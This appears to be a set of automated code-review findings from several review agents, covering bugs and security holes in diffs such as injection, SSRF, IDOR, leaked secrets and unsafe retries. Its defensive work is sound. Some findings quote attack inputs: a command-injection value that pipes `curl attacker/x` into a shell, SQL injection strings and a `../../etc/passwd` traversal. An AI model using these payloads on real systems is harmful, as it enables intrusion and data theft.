findings.title: File handle leaks on header-mismatch and exception paths
findings.body:
`fh = open(path)` on line 10 is not wrapped in a `with` block, and `fh.close()` on line 16 is only reached on the success path. When the header does not match, line 14 returns `None` with the handle still open; likewise any exception raised by `next(reader)` (line 12) or `list(reader)` (line 15) escapes without closing. Repeated validation failures will accumulate open descriptors until GC happens to collect them (and on non-CPython implementations, indefinitely). Use the same pattern as `read_rows` on lines 5-6:

```python
with open(path) as fh:
    reader = csv.reader(fh)
    header = next(reader, None)
    if header != expected_header:
        return None
    return list(reader)
```

_Also raised by the security agent:_ Descriptor leak on header-mismatch path enables fd exhaustion

findings.title: No test covers read_validated, including its file-handle leak on mismatch
findings.body: The new function read_validated has two distinct behaviors: returning None on header mismatch (leaking the open file handle since fh.close() is only reached in the success path) and returning rows on success. No test exists for either path, so the leak on validation failure (line 14, missing close before return None) would not be caught by any test suite.

findings.title: retry(attempts=3) wraps non-idempotent charge — duplicate charges
findings.body:
`charge()` is documented in billing/gateway.py as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs after the gateway has already created the charge (timeout on the response, connection reset, 5xx returned after commit) will be retried and create a second and third charge. The customer is billed up to 3x with no way for this layer to tell the difference from a genuine first-attempt failure.

The gateway docstring names the fix: it supports an `Idempotency-Key` header. Generate a key once per logical charge (per call to `charge_card`, before the retry loop) and pass it through `charge()` so the gateway collapses retried attempts into one charge. Until `charge()` accepts and forwards such a key, this function should not be retried at all. Note the contrast with `fetch_charge` above it, which wraps `get_charge` — documented "Safe to repeat" — so the retry there is fine and is not evidence that the same decorator is safe here.

_Also raised by the security agent:_ Retry wraps non-idempotent charge with no Idempotency-Key

findings.title: Retry decorator on non-idempotent charge call lacks safety documentation
findings.body: The `charge_card` function wraps `charge()`, which is explicitly documented as NOT idempotent (each call creates a new charge). The wrapper has no docstring explaining that this is unsafe to retry without an Idempotency-Key, or documenting that the caller must pass one. A caller reading this function signature and using it could cause duplicate charges by triggering retries on a transient failure.

findings.title: No test catches retrying a non-idempotent charge call
findings.body: charge_card wraps billing.gateway.charge, which the gateway docstring explicitly states is NOT idempotent (each call creates a new charge) unless an Idempotency-Key is passed. The @retry(attempts=3) decorator will re-invoke charge() on transient failures without any idempotency key, risking duplicate charges. There is no test in this diff (or referenced elsewhere) that exercises retry behavior against a failing charge() call to verify at most one charge is created, or that would fail if this bug were introduced.

findings.title: Naive datetime subtracted from tz-aware expires_at raises TypeError
findings.body:
`datetime.now()` returns a naive datetime, while `Invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every invite, not just an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does: `cutoff = datetime.now(timezone.utc).replace(microsecond=0)`. (Note that even if it were made naive-safe by stripping tzinfo, `datetime.now()` is local time, so the comparison would also be wrong by the UTC offset.)

_Also raised by the docs agent:_ Timezone mismatch in expires_within comparison

findings.title: expires_within has no test and would crash if exercised
findings.body: The new function expires_within uses datetime.now() (naive) subtracted from invite.expires_at (tz-aware per models/invite.py), which raises TypeError: can't subtract offset-naive and offset-aware datetimes at runtime. No test exists for this function, so this defect would not be caught by the test suite before shipping.

findings.title: contactEmail throws when billingContact is absent
findings.body:
`Account.billingContact` is declared optional (`billingContact?`) and documented as "Absent until the customer completes onboarding", so for any pre-onboarding account `account.billingContact` is `undefined` and `.email` throws `TypeError: Cannot read properties of undefined`. The sibling function on line 4 handles exactly this case with `?.` plus a `??` fallback, which confirms the absent case is reachable in practice.

Give `contactEmail` the same treatment, e.g. return `account.billingContact?.email.toLowerCase() ?? ""`, or widen the return type to `string | undefined` and let callers decide. (If this file compiles today, `strictNullChecks` is likely off — worth confirming, since the compiler would otherwise reject line 8.)

_Also raised by the docs agent:_ Public function crashes on optional field without documenting it

findings.title: contactEmail throws on missing billingContact, untested
findings.body: contactEmail accesses account.billingContact.email directly without optional chaining, even though Account.billingContact is typed as optional (per web/src/types.ts). If billingContact is undefined, this throws a TypeError at runtime. No test in this PR exercises contactEmail with an account lacking billingContact, so this crash would go undetected.

findings.title: Lowered default retries regresses INC-4471 for nightly partner sync
findings.body:
`fetch()`'s default `retries` drops from 5 to 1. `sync/nightly.py::sync_partner_catalogue()` calls `fetch(url)` with no explicit `retries` and its docstring states the partner API returns 503 roughly one call in three during the nightly window, and that relying on the default retry count was the deliberate fix for INC-4471. With `retries=1` the chance of the sync failing goes from negligible to roughly 1 in 9 (or ~1 in 3, depending on whether `retries` counts attempts or re-attempts) per nightly run, reopening that incident.

Either keep the default at 5, or make the dependency explicit at the call site by passing `retries=5` in `sync_partner_catalogue()` as part of this change so the behaviour survives the default change.

findings.title: No test guards fetch()'s default retry count relied on by callers
findings.body: fetch()'s default retries was lowered from 5 to 1. sync_partner_catalogue() in sync/nightly.py explicitly relies on the old default to survive the partner API's ~33% 503 rate (documented as the fix for INC-4471), but calls fetch() without passing retries explicitly. There is no test in the diff (or apparent in the repo) that would fail when this default changes, so this regression would ship silently and reintroduce INC-4471.

findings.title: Duplicate index on invoices (tenant_id, created_at DESC)
findings.body:
`invoices_tenant_created_idx2` indexes exactly the same table, columns and sort order as `invoices_tenant_created_idx`, created in migrations/0007_invoice_indexes.sql and already applied (2025-11-02). Because the name differs, Postgres will not reject it — the migration succeeds and the database silently carries two identical btrees on `invoices`. That doubles the index maintenance cost on every INSERT/UPDATE/DELETE to `invoices` and duplicates the storage, while the planner can only ever use one of them.

If the existing index is sufficient (it appears to be), drop this statement. If the intent was something subtly different (e.g. a partial index, an INCLUDE column, or a different sort direction), make that explicit in the DDL, because as written it is not different. Also note that on a large `invoices` table a plain `CREATE INDEX` takes an ACCESS EXCLUSIVE-blocking build; `CREATE INDEX CONCURRENTLY` would be the safer form if the index really is needed.

findings.title: Eviction clears the whole cache, including the entry just written
findings.body:
When `_CACHE` crosses 1000 entries the branch discards every entry — including the `tenant` stored one line above. A caller that does `get_tenant_fresh(id)` and then relies on `get_tenant(id)` returning the warm value will get `None` on the request that triggers the clear, and every other tenant's entry is dropped at the same time, so the cache repeatedly collapses to empty under steady load. Replace the wipe with a bounded eviction (e.g. pop the oldest key, or use `functools.lru_cache`/`OrderedDict` with `popitem(last=False)`) so the freshly fetched entry survives and only the excess is removed.

The same lines are also a check-then-act on module-level mutable state with no lock: two threads can both observe `len(_CACHE) > 1000` and one can clear the dict immediately after the other has written, so the loss is not confined to the caller that tripped the threshold.

findings.title: get_* prefix suggests read-only, but function mutates cache
findings.body:
The function name `get_tenant_fresh` follows the `get_*` convention, which signals a read-only accessor to callers. However, the function mutates the shared `_CACHE` by writing to it (line 10) and clearing it when size exceeds 1000 (lines 11–12). This violates the implicit contract of the naming pattern and makes callers who expect a side-effect-free read vulnerable to surprises.

Rename to `fetch_tenant_fresh()`, `refresh_tenant()`, or similar to signal that this operation has side effects.

findings.title: A None/missing result from _fetch is cached and poisons get_tenant
findings.body: The return value of `_fetch` is stored without any check. If `_fetch` can return `None` for an unknown tenant (or for a transient backend failure that it swallows), that `None` is written into `_CACHE`, and because `get_tenant` reports a miss as `None` via `_CACHE.get`, callers cannot distinguish "not cached" from "cached as absent" — and the absent value sticks until the next clear. Guard the write (`if tenant is not None:`) or make the miss sentinel explicit so a failed fetch is not cached as a negative result.

findings.title: Full cache flush at 1000 entries enables cheap cache-eviction DoS
findings.body: When the cache exceeds 1000 entries, `_CACHE.clear()` discards every entry rather than evicting a single one. If `tenant_id` can be influenced by a caller (e.g. reached from a request handler that accepts a tenant identifier), anyone able to issue lookups with 1000 distinct, even nonexistent, ids can repeatedly wipe the cache for all tenants, forcing every subsequent `get_tenant_fresh` to hit `_fetch` and amplifying load on the backing store. Consider a bounded LRU (`functools.lru_cache` or `collections.OrderedDict` with `popitem(last=False)`) so a single eviction removes one entry, and only cache ids that resolve to a real tenant so unknown ids cannot grow the map.

findings.title: No test coverage for get_tenant_fresh's fetch/cache/evict behavior
findings.body: get_tenant_fresh introduces new behavior: fetching fresh data, writing it into _CACHE, and clearing the entire cache once it exceeds 1000 entries. None of this is exercised by any test in the diff. If the eviction threshold were off-by-one, or if the function failed to update _CACHE, or if _fetch's return value were silently dropped, nothing would fail today.

findings.title: README documents renamed CLI flag incorrectly
findings.body: The README on line 7 documents the `--workers` flag, but the code has renamed it to `--concurrency` (cli.py line 6). A user following the README will use the wrong flag name and the tool will not recognize it. Update the README to reflect the new flag name.

findings.title: Flag rename changes namespace attribute from workers to concurrency
findings.body: Renaming `--workers` to `--concurrency` also renames the argparse destination: the parsed namespace now exposes `args.concurrency` and no longer has `args.workers`. Any code doing `args.workers` will raise `AttributeError` at runtime, and any code using `getattr(args, "workers", 4)` will silently fall back to a default instead of the user's value. It also breaks existing invocations/scripts passing `--workers`. Confirm every consumer of the parsed namespace was updated; if backward compatibility is wanted, keep the old spelling as an alias (`p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`).

findings.title: Docstring contradicts new return type
findings.body: The docstring states the function returns "the total number of API calls this month as an integer", but the implementation now returns a dictionary mapping days to call counts. A caller following the docstring will attempt to use the return value as an integer and fail. Update the docstring to describe the new return format: a dictionary with day keys and count values.

findings.title: monthly_usage return shape changed from int to dict
findings.body: `monthly_usage` previously returned a single integer (`_db.scalar(...)`) and now returns `{day: count}`. Any existing caller doing arithmetic, comparison, or formatting on the result (e.g. `monthly_usage(a) > limit`, `f"{monthly_usage(a)} calls"`) will now silently compare/format a dict or raise a TypeError. If both views are needed, add a separate function (e.g. `daily_usage`) and keep `monthly_usage` returning the total, or update every call site plus the docstring in the same change.

findings.title: No test covers the new per-day usage breakdown behavior
findings.body: monthly_usage now returns a dict mapping day to count instead of a single integer total, but no test file is present in this diff. Any existing test asserting the old scalar-return behavior would now fail, and there is nothing shown that verifies the new dict-shaped return value, its keys, or its grouping logic. Without a test exercising this function against a fake/mock _db returning multiple day rows, a regression (e.g. wrong grouping, wrong key names, or reverting to a scalar) would go undetected.

findings.title: Renaming page_size to limit breaks keyword-argument callers
findings.body: `list_invoices` is a module-level function whose second parameter has a default, which is exactly the shape callers tend to pass by keyword (`list_invoices(tid, page_size=100)`). After this rename any such call site raises `TypeError: list_invoices() got an unexpected keyword argument 'page_size'` — a failure that only appears at runtime, since nothing in the signature change is caught statically. No call sites were available in the retrieved context, so please confirm all callers (including any outside this repo, if this is a published API) pass positionally or have been updated. If external compatibility matters, accept `page_size` as a deprecated alias for one release rather than renaming outright.

findings.title: Docstring documents old parameter name
findings.body: The docstring argument documentation refers to `page_size`, but the function parameter was renamed to `limit` on line 1. Update the docstring to match the new parameter name.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a command string on line 9 and runs it through the shell on line 10. Neither value is quoted, escaped, or validated, so a value such as `foo; curl attacker/x | sh` or `foo$(id)` executes arbitrary commands with the privileges of the process.

Fix by dropping the shell entirely and passing an argument list, matching the existing `list_exports` style:

```python
subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)
```

Also validate `name` against an allowlist (e.g. `[A-Za-z0-9_-]+`) before joining it into `/exports/`, since `..` segments would otherwise let a caller write the archive outside the export directory. If a shell really is required, use `shlex.quote` on every interpolated value.

findings.title: Unquoted interpolation into shell command breaks on spaces/metacharacters
findings.body: `cmd` is assembled with an f-string and executed with `shell=True`, so `name` and `directory` are re-parsed by the shell. A perfectly ordinary input like `directory="/data/my exports"` makes tar receive two operands (`/data/my` and `exports`) and fail or archive the wrong paths; `name="2024 Q1"` writes `/exports/2024` and passes `Q1.tar.gz` as an operand. Characters such as `;`, `&&`, `|`, `$(...)`, `*` and `~` change the command outright. The sibling `list_exports` on line 5 already shows the correct pattern: pass an argument list and let `subprocess` avoid the shell, e.g. `subprocess.run(["tar", "-czf", f"/exports/{name}.tar.gz", directory], check=True)`. Validating `name` against a strict allowlist (no `/`, no `..`) is still worthwhile, since it is interpolated into a filesystem path.

findings.title: No test coverage for new create_archive function
findings.body: create_archive builds a shell command via string interpolation and executes it with shell=True. There is no test in this diff exercising this function, so a change to its behavior (or a fix to the injection risk) would not be caught by any test suite. Add a test that verifies the command executed for a given name/directory (e.g. via mocking subprocess.run) and specifically a test with a malicious name (e.g. containing ';' or spaces) to lock in expected sanitization/quoting behavior once fixed.

findings.title: Wildcard CORS origin combined with credentials bypasses allowlist
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`, discarding the `ALLOWED` allowlist used by the existing export two lines above. Entry point: the `Origin` request header on any route mounted with `dashboardCors`; sink: the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers, which then govern whether a third-party page may read authenticated responses.

Two outcomes, both bad:
- If the middleware (or any wrapper/proxy in front of it) reflects the request `Origin` when configured with `*` and credentials — a very common behaviour — then any site a logged-in user visits can issue credentialed cross-origin requests to the dashboard API and read the responses, i.e. full session-scoped data exfiltration and state change.
- If the literal `*` is emitted, browsers reject every credentialed request, so the middleware is simply broken and the next person will "fix" it by reflecting the origin, landing in case one.

Fix: reuse the `ALLOWED` allowlist (or an explicit dashboard-origin list) instead of `"*"`. Never combine a wildcard/reflected origin with `credentials: true`; if the dashboard endpoints are genuinely public, drop `credentials` instead of widening the origin.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
`dashboardCors` emits `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. The Fetch spec forbids this combination: when a request is made with `credentials: 'include'` (or `withCredentials`), the user agent fails the CORS check if the allow-origin header is the literal `*`, regardless of the allow-credentials header. So this middleware will not actually enable the dashboard's authenticated cross-origin calls — every such request will be blocked by the browser, and preflights will appear to succeed while the real request fails.

If the dashboard genuinely needs cookies/authorization forwarded, the origin must be reflected explicitly, e.g. `origin: DASHBOARD_ORIGINS` (an allow-list, as the existing `ALLOWED` export on line 6 already does) so the response carries the concrete requesting origin plus `Vary: Origin`. If credentials are not needed, drop `credentials: true` instead.

findings.title: Live AcmePay secret key hardcoded, replacing env var lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` is a committed credential. The `acme_live_` prefix indicates a production (not test/sandbox) key, and it is assigned directly to `acmepay.api_key`, so this is the credential the service actually authenticates with. The change also deletes `import os` and the `os.environ["ACMEPAY_SECRET_KEY"]` lookup, so the secret is no longer injected at runtime and cannot be rotated without a code change.

Anyone with read access to the repository \u2014 including anyone who later gets a clone, a fork, a CI log, or a built artifact \u2014 can charge, refund, or read payment data with this key. Git history preserves it even after a follow-up commit removes the line.

Actions: (1) treat this key as compromised and rotate it at the provider immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or an equivalent secret-manager fetch); (3) purge the value from git history, not just from HEAD; (4) consider a pre-commit secret scanner so `acme_live_` literals are blocked.

findings.title: Key is no longer environment-configurable; non-prod runs hit the live key
findings.body: Before this change `acmepay.api_key` was resolved per process from `os.environ["ACMEPAY_SECRET_KEY"]`, so dev, CI, staging and production each supplied their own key and a missing key failed loudly with `KeyError` at call time. After the change every environment that imports this module binds the same `acme_live_...` literal, so any test or staging run that constructs a real client transacts against the live account, and there is no longer any way to point a deployment at a different key without editing source and redeploying (key rotation likewise becomes a code change). Restore the `os.environ` lookup (optionally with an explicit error message), and if a default is genuinely wanted, make it a non-live placeholder rather than a live key.

findings.title: No test verifies client() sets acmepay.api_key correctly
findings.body: client() now assigns a hardcoded module-level constant to acmepay.api_key instead of reading from the environment. There is no test in this diff (or referenced) that calls client() and asserts on acmepay.api_key or the returned client. The new tests/fixtures/acmepay.py only defines a fixture (TEST_KEY, fake_client) but nothing imports or exercises billing/acmepay_client.client() itself, so a regression here (e.g. wrong key, missing assignment, wrong return value) would not be caught by any test.

findings.title: tenant_of trusts an unverified JWT for tenant identity
findings.body:
`tenant_of` decodes the token with `options={"verify_signature": False}` and returns `tenant_id` from the resulting payload. Anyone can mint a JWT body with an arbitrary `tenant_id` (the signature is never checked), so any caller using this value to scope a query, pick a schema, or authorise access will happily operate on another tenant's data. The sibling `claims_for` on line 7 already does the verified decode with `public_key()`; `tenant_of` should call it (or repeat the same verified decode) and read `tenant_id` from the verified claims rather than skipping the key lookup. Note also that in PyJWT disabling `verify_signature` disables the registered-claim checks with it, so expired and wrong-audience tokens are accepted here too.

_Also raised by the security agent:_ tenant_id read from a JWT with signature verification disabled

findings.title: Public function `tenant_of` missing critical security caveat
findings.body: The function `tenant_of` decodes a JWT without verifying its signature (line 11: `verify_signature: False`). This is a dangerous operation that could allow an attacker to forge a token with an arbitrary tenant_id. A caller reading only the function name and signature would have no way to know this accepts unverified input, and could mistakenly use it in a security-sensitive context (e.g., to authorize a request). The function needs a docstring explaining why signature verification is skipped and what preconditions must hold for its safe use.

findings.title: New tenant_of() function has no test coverage
findings.body: tenant_of() is a new function that decodes a JWT without verifying its signature and extracts tenant_id. There is no test in this diff exercising it — e.g. verifying it returns the correct tenant_id for a valid token, or how it behaves with a malformed/tampered token or a token missing the tenant_id claim (which would raise KeyError). Since this function's behavior (trusting unverified claims) is exactly the kind of logic that's easy to get subtly wrong or accidentally 'fix' in a way that changes contract, a regression here would go undetected.

findings.title: Missing tenant_id claim raises KeyError instead of an auth error
findings.body: `unverified["tenant_id"]` assumes the claim is always present. A token issued before the claim existed, or any token from a different issuer, produces a bare `KeyError` that callers of an auth helper are unlikely to catch, surfacing as a 500 rather than an authentication/authorisation failure. Use `.get("tenant_id")` and raise a domain-specific error, or validate the claim's presence explicitly.

findings.title: Missing ownership check lets any user modify any payment method
findings.body:
`update_payment_method` takes `pm_id` straight from the request, loads the object with `PaymentMethod.get(pm_id)` (line 12), and writes `body["billing_name"]` to it followed by `pm.save()` (lines 13-14). No authorisation check runs between the load and the mutation. `current_user(request)` on line 11 only authenticates — its docstring in `api/auth.py` says so explicitly — and the resulting `user` value is never used afterwards, which strongly suggests the `require_owner` call was intended and dropped.

Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another user's stored payment method (a plausible step toward payment fraud or social-engineering a chargeback).

Fix: mirror the read path on line 6 — insert `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` call and before any field assignment or `save()`.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unvalidated body["billing_name"] raises KeyError on malformed request

findings.title: No test coverage for update_payment_method's missing ownership check
findings.body: update_payment_method loads a PaymentMethod by id and mutates/saves it without calling require_owner(user, pm), unlike get_payment_method which does call it at line 6. No test was added for this new function, so a test suite would not catch a user updating another user's payment method. Add a test asserting that calling update_payment_method with a pm_id owned by a different user raises Forbidden (or equivalent), and a test for the happy path where the owner can update.

findings.title: Public API violates documented authorization contract
findings.body: The new `update_payment_method` function mutates a `PaymentMethod` object without calling `require_owner()`. The repository's own documentation in `api/auth.py` states 'Every object mutation must call this' when referring to the `require_owner` function. This function's contract is now untrue: it allows any authenticated user to update any payment method by ID, regardless of ownership. Either add the missing `require_owner()` call or document why this function is exempt from the stated requirement.

findings.title: Rate limit removed from password reset endpoint
findings.body:
`request_reset` is now reachable without any throttling: the `@rate_limit("5/hour")` decorator and its `from limits import rate_limit` import were both deleted, and nothing in the remaining three lines replaces them. An unauthenticated caller can drive `send_reset_email(email)` in a loop, which enables (a) mail-bombing an arbitrary victim address, (b) burning the outbound mail quota / getting the sending domain blocklisted, and (c) cheap account-existence enumeration if the response or timing differs for known vs. unknown addresses — the handler returns a flat `{"sent": True}` here, but any upstream difference becomes free to probe at scale.

If the limiter was moved rather than dropped, point at where — middleware or gateway config — in the PR description. Otherwise restore the decorator, and consider keying it on both source IP and the submitted `email` so one attacker cannot target a single victim from many addresses.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, but no test file is included in this diff. If there had been a test asserting that repeated calls to `request_reset` are throttled, this change would have failed it; since none is visible, the removal (and any future regression of it) would pass silently.

findings.title: read_export_preview skips _confined(), allowing path escape
findings.body:
The sibling reader resolves the requested name through `_confined(name)` (line 14) before opening it, which is evidently the guard that keeps reads inside `EXPORT_ROOT`. `read_export_preview` instead builds the path with a bare `os.path.join(EXPORT_ROOT, name)` on line 20. `os.path.join` does not confine anything: a `name` containing `../` traverses upward, and an absolute `name` (e.g. `/etc/passwd`) discards `EXPORT_ROOT` entirely, so the join result is the attacker's path verbatim. The first 4096 bytes of any file readable by the process are then returned to the caller.

Fix by routing through the same helper: `path = _confined(name)` before the `open`, so both entry points share one enforcement point.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: New unconfined path function has no test coverage
findings.body: read_export_preview builds a path via os.path.join(EXPORT_ROOT, name) without calling the _confined() helper used by the sibling function above it. There is no test in this diff exercising this function with a traversal-style name (e.g. '../../etc/passwd') or verifying it stays within EXPORT_ROOT, so a regression or the introduction of this bug itself would not be caught by any test.

findings.title: Public function `read_export_preview` has no docstring
findings.body: The function `read_export_preview` is a public API (exported at module level, callable from other modules) that accepts a `name` parameter and constructs a filesystem path from it. A caller reading only the function signature would not know whether `name` is already a safe, confined path or whether it may contain path traversal sequences. The existing `read_export` function directly above it calls `_confined()` to normalize the path; this new function does not. Without a docstring explaining the path-handling contract, a caller could easily misuse this function by passing untrusted input.

findings.title: bulk_export no longer enforces tenant ownership on returned reports
findings.body:
`require_owner` was dropped from the import and the `for report in reports: require_owner(user, report)` loop was deleted. `bulk_export` now fetches every `Report` by the caller-supplied `report_ids` and serialises it with no tenant check, so any authenticated caller can read another tenant's reports by guessing or enumerating ids. The `user = current_user(request)` on line 5 is now dead — a strong signal the check was the only thing consuming it. Restore the check; if the loop was the performance problem, do the filtering in the fetch (e.g. a single query scoped by `user.tenant_id`) rather than removing the control, and raise/omit rather than return foreign rows.

_Also raised by the security agent:_ Tenant ownership check removed from bulk_export (cross-tenant IDOR)

findings.title: No test guards authorization on bulk_export
findings.body: The diff removes the require_owner check from bulk_export, which previously enforced tenant isolation on each report. No test file is part of this change, and there is no evidence of an existing test asserting that bulk_export raises Forbidden for cross-tenant reports. As a result, this authorization regression would not be caught by CI.

findings.title: Public endpoint lacks documented access control
findings.body: The `bulk_export` function is a public endpoint that now accepts arbitrary `report_ids` and returns their data without an ownership check. A caller cannot determine from the function signature or any docstring whether they can export reports belonging to other tenants. This is a contract violation: the function name does not indicate access restrictions, the parameters do not document them, and no docstring exists to clarify the authorization model. A competent caller reading this code would have no way to know whether this operation is restricted.

findings.title: Unknown report id may now surface as AttributeError instead of Forbidden
findings.body: If `Report.get(rid)` returns `None` for an unknown id, the old code would have hit `require_owner(user, None)` and failed on the tenant comparison; now the `None` flows straight to `r.to_dict()` on line 7 and raises `AttributeError`, which typically becomes a 500 rather than a 403/404. Filter or explicitly reject missing ids when you restore the ownership check.

findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL string with an f-string and then calls `execute(sql)` with no `params`. Both values land inside single-quoted literals, so any caller-supplied `'` closes the literal and the rest of the value is parsed as SQL — e.g. `status = "x' OR '1'='1"` returns every customer row, and `term = "%' UNION SELECT ... --"` can read arbitrary tables (or, depending on driver/multi-statement settings, write or drop them).

Fix by using the same parameterised form as `get_customer` on line 5, keeping the wildcards in the bound value rather than the SQL text:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

If `term` may contain `%` or `_` that should be literal, escape those in the bound value too.

findings.title: search_customers interpolates values instead of passing params to execute()
findings.body:
`execute` is documented as "Run a parameterised query. `params` must carry every caller value." Here the two caller values (`term`, `status`) are baked into the SQL text and `execute(sql)` is called with `params=None`, so the contract is broken at the only call site that has user-supplied values.

Beyond the obvious injection exposure, this is also plainly incorrect for legitimate inputs:
- `term="O'Brien"` closes the string literal and yields a syntax error from the driver.
- `term=None` / `status=None` interpolate the text `None` rather than matching NULL or being rejected.
- Any `%` or `_` a user types in `term` is silently treated as a LIKE wildcard.

Follow the pattern already used one line above in `get_customer` and let the driver bind the values:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the *parameter*, not the SQL text, so the driver escapes the user portion.

findings.title: search_customers has no test; injection-prone query untested
findings.body: The new search_customers function builds a raw f-string SQL query and passes it to execute() with no parameters. There is no test exercising this function, so nothing would catch either a correctness regression (e.g. wrong filtering) or the underlying injection defect if it were fixed incorrectly later. A test with a term/status containing quotes or SQL metacharacters would surface the problem.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS invariant enforced next to it
findings.body:
The function immediately above performs `if host not in ALLOWED_HOSTS: raise ValueError("destination not allowed")` before issuing a request, establishing the module invariant that caller-supplied destinations are checked against an allowlist. `verify_endpoint` issues `requests.get(url, ...)` on an unvalidated, caller-supplied URL with no host check and no scheme check, so it can be pointed at internal addresses (link-local metadata endpoints, loopback services) or non-HTTP schemes. Extract the host/scheme validation from the send path into a shared helper and call it here before the request; also pass `allow_redirects=False` (or re-validate on redirect) so a permitted host cannot redirect the fetch to an internal one.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches caller-supplied URL with no allowlist

findings.title: New SSRF-prone verify_endpoint has no test coverage
findings.body: verify_endpoint issues a GET to an arbitrary caller-supplied URL without the ALLOWED_HOSTS check used by the function above it, and no test exercises this function at all. A test asserting that verify_endpoint rejects disallowed hosts (mirroring the existing check) would have caught this behavior gap; since none exists, the missing allowlist enforcement will go undetected by CI.

findings.title: verify_endpoint raises instead of reporting an unreachable endpoint
findings.body: `requests.get` raises `ConnectionError`, `Timeout`, `TooManyRedirects` or `MissingSchema` rather than returning a response for exactly the inputs this function exists to detect: an endpoint that is down, slow, or a malformed URL. A caller reading the name will reasonably expect a status value (or a falsy result) and will get an exception escaping from the integration layer. Wrap the call and return a sentinel (e.g. `None`) or document/declare the raised exception types explicitly.

findings.title: Customer invoices bucket has all public access blocks disabled
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets `block_public_acls`, `block_public_policy`, `ignore_public_acls` and `restrict_public_buckets` all to `false` for `acme-customer-invoices`. Unlike the `assets` bucket, this one is named for customer invoices and there is nothing in the diff suggesting it is meant to be public. With all four controls off, any principal that can set an ACL or attach a bucket policy (including an over-broad CI role, or a later commit adding a policy) can make invoice objects world-readable, and the account-level safety net that would normally override such a policy is switched off.

Unless public serving is intended, either omit this resource entirely (AWS now defaults to blocking public access) or set all four attributes to `true`. If some narrow sharing is required, do it with a scoped bucket policy or presigned URLs rather than by disabling the public access block.

_Also raised by the correctness agent:_ Invoices bucket disables all public access protections

findings.title: Public access configuration contradicts PR intent
findings.body: The PR description states 'One bucket is deliberately public; the next is not meant to be,' but the invoices bucket (lines 13-23) is configured with identical public access settings as the assets bucket: all block_public_* parameters are set to false, making it public. Either the configuration should restrict public access for invoices, or the PR description is misleading about the intended behavior. This mismatch creates a contract violation where future maintainers or reviewers cannot rely on the PR description to understand what was intentional.

findings.title: verify_acmepay compares HMAC with == instead of compare_digest
findings.body:
`verify_acmepay` computes the same HMAC hexdigest as `verify_stripe` but validates it with `expected == header`. Python's `==` on strings short-circuits at the first differing byte, so comparison time leaks how many leading characters of the expected digest the caller guessed. That turns signature forgery from an infeasible search into an incremental byte-at-a-time recovery for an attacker who can time or measure many webhook deliveries — the exact attack `hmac.compare_digest` on line 7 exists to prevent. Change line 12 to `return hmac.compare_digest(expected, header)` to match the sibling verifier.

_Also raised by the security agent:_ Webhook signature compared with == instead of compare_digest

findings.title: Public API contract: verify_acmepay lacks timing-safe comparison
findings.body: The function `verify_acmepay` is a public API (callable by webhook handlers, paralleling `verify_stripe`). Its contract—a HMAC signature comparison function—is established by its name and the existing `verify_stripe` above it, which uses `hmac.compare_digest()` for timing-safe comparison. A caller following the existing pattern would expect `verify_acmepay` to provide the same timing-safe guarantee, but it uses `==` instead. This is a contract violation: the caller's reasonable expectation (based on the parallel API) is now false. Document the timing-unsafe comparison explicitly in a docstring, or use `hmac.compare_digest()` like `verify_stripe` does.

findings.title: Exception text and traceback returned in HTTP 500 response body
findings.body:
`handle()` previously returned a fixed `{"error": "internal error"}` body; it now serialises `str(exc)` and `traceback.format_exc()` into the response. Any client able to provoke an unhandled exception gets absolute source paths, module and function names, library versions implied by the frames, and whatever the exception message contains \u2014 commonly SQL fragments, internal hostnames, or DSNs with embedded credentials for driver-level errors. That is a direct aid to reconnaissance for an attacker probing the API, and the detail is already captured server-side by the `log.exception` call on line 8, so nothing is gained by echoing it.

Keep the opaque body for the client and correlate with the log instead, e.g. generate a request/error id, log it alongside the exception, and return `{"error": "internal error", "id": err_id}`. If verbose output is genuinely wanted for local work, gate it behind an explicit debug flag that defaults to off rather than making it the unconditional behaviour.

_Also raised by the correctness agent:_ traceback.format_exc() ignores `exc` and depends on ambient state

_Also raised by the correctness agent:_ Error response body changed shape: constant `error` replaced, `traceback` added

findings.title: No test covers handle()'s response payload content
findings.body: The change alters the error response body from a generic message to include the raw exception string and full traceback. No test in this diff verifies the shape or content of the returned dict/status code, so a future revert, change in verbosity, or accidental leak of sensitive exception data would not be caught by any automated check.

findings.title: Public error handler lacks documentation of contract
findings.body: The `handle()` function is a public error handler that now returns exception details and tracebacks to clients. Callers need to understand that this function intentionally exposes internal error information in its response, so they can make informed decisions about where to use it. Add a docstring documenting the response structure and the security trade-off of exposing exception details.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
